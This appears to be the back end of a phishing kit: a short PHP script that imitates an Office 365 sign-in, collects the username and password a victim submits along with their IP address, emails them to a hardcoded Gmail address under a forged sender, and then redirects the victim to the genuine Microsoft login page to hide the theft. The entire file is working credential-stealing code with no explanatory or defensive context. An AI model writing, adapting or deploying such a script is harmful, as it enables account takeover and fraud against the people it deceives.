<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ office 365 +--------------\n";
$message .= "Username : ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['psw']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ShellsHost-----------------\n";
$send = "domitilaryacc1800@gmail.com";
$subject = "NEW office 365 [ $ip ]";
$headers = "From: office 365<logs@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>
<script>
    window.top.location.href = " https://login.live.com";

</script>

